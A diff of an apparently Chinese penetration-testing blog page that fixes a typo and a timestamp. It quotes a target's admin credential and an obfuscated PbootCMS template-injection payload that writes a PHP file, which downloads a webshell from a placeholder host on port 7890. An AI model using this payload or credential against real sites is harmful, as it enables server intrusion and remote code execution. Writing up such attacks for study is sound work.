@@ -64,7 +64,7 @@
 <meta property="og:image" content="https://typro-1304950244.file.myqcloud.com/image-20220522125301379.png">
 <meta property="og:image" content="https://typro-1304950244.file.myqcloud.com/image-20220522125857717.png">
 <meta property="article:published_time" content="2022-04-15T08:24:14.000Z">
-<meta property="article:modified_time" content="2022-06-18T04:59:14.829Z">
+<meta property="article:modified_time" content="2022-06-18T14:33:08.643Z">
 <meta property="article:author" content="1in3r">
 <meta property="article:tag" content="内网渗透">
 <meta name="twitter:card" content="summary">
@@ -228,7 +228,7 @@
 <p><img src="https://typro-1304950244.file.myqcloud.com/image-20220521180338988.png" alt="image-20220521180338988"></p>
 <p>admin:admin7788 可以登陆后台</p>
 <p><img src="https://typro-1304950244.file.myqcloud.com/image-20220521180359363.png" alt="image-20220521180359363"></p>
-<p>在网站后台的站点信息里、是可以直接修改前台index.php的文件的，但是我们直接写马是不行的、我们可以使用file_get_connet()函数，那么构造payload</p>
+<p>在网站后台的站点信息里、是可以直接修改前台index.php的文件的，但是我们直接写马是不行的、我们可以使用file_get_contents()函数，那么构造payload</p>
 <figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;pboot:if(implode(&#x27;&#x27;,[&#x27;f&#x27;,&#x27;i&#x27;,&#x27;l&#x27;,&#x27;e&#x27;,&#x27;<span class="built_in">_</span>&#x27;,&#x27;p&#x27;,&#x27;u&#x27;.&#x27;t&#x27;,&#x27;<span class="built_in">_</span>c&#x27;,&#x27;o&#x27;,&#x27;n&#x27;,&#x27;t&#x27;,&#x27;e&#x27;,&#x27;n&#x27;,&#x27;t&#x27;,&#x27;s&#x27;])(implode(&#x27;&#x27;,[&#x27;3&#x27;,&#x27;.php&#x27;]), implode(&#x27;&#x27;,[&#x27;&lt;?php file<span class="built_in">_</span>&#x27;,&#x27;put<span class="built_in">_</span>&#x27;,&#x27;contents(&#x27;,&#x27;&quot;shell.php&quot;,&#x27;,&#x27;file&#x27;,&#x27;<span class="built_in">_</span>get<span class="built_in">_</span>&#x27;,&#x27;contents(&quot;&#x27;,&#x27;http://ip:7890/shell.txt&quot;))?&gt;&#x27;])))&#125;!!!&#123;/pboot:if&#125;</span><br></pre></td></tr></table></figure>
 
 <p>公司信息处插入以上payload之后提交保存</p>
